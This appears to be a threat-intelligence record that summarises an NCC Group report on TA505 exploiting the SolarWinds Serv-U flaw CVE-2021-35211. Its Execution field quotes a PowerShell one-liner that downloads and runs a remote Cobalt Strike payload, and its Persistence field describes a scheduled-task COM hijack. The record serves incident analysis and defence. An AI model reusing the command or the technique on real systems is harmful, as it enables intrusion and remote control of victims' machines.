        "Initial Access": "On November 8, 2021, NCC Group reported that TA505, a known cybercrime threat actor, has been exploiting a vulnerability in SolarWinds Serv-U software, identified as CVE-2021-35211, to gain initial access to victims' IT infrastructure. This marks a shift from TA505's typical phishing-based methods to exploiting software vulnerabilities for initial access. SolarWinds released a security advisory on July 9, 2021, and Microsoft reported on July 13, 2021, that the vulnerability was being exploited by a different threat actor, DEV-0322. TA505's exploitation of the vulnerability allows them to control a subprocess of Serv-U, enabling further penetration into the network.",
        "Execution": "TA505 utilized Base64 encoded PowerShell commands to deploy Cobalt Strike Beacon on systems running the vulnerable Serv-U software. The PowerShell command used for deployment was observed as follows: powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://IP:PORT/a')).",
        "Persistence": "TA505 attempted to maintain access by hijacking a scheduled task named RegIdleBackup and altering the COM handler associated with it to execute the FlawedGrace RAT. The legitimate CLSID for the COM handler is {CA767AA8-9157-4604-B64B-40747123D5F2}, but TA505 changed it to a different CLSID, which redirected to another CLSID containing three objects with the FlawedGrace RAT loader encoded in Base64.",
        "Defense Evasion": "TA505 modified the registry to ensure the hijacked RegIdleBackup scheduled task executed the FlawedGrace RAT loader, which was stored as Base64 encoded strings in the registry.",
        "Others": "NCC Group's global Cyber Incident Response Team has noticed an increase in Clop ransomware victims, which is linked to the exploitation of the SolarWinds Serv-U vulnerability by TA505. Organizations using SolarWinds Serv-U software are advised to update to the latest version and check for signs of exploitation. NCC Group mapped the internet for vulnerable servers and found a significant number still at risk, with the top vulnerable versions listed. The top countries with potentially vulnerable servers include China, the United States, Canada, and others. The MITRE ATT&CK mapping for TA505's activities includes T1190 for Initial Access, T1059.001 for Execution, T1053.005 for Persistence, and T1112 for Defense Evasion."
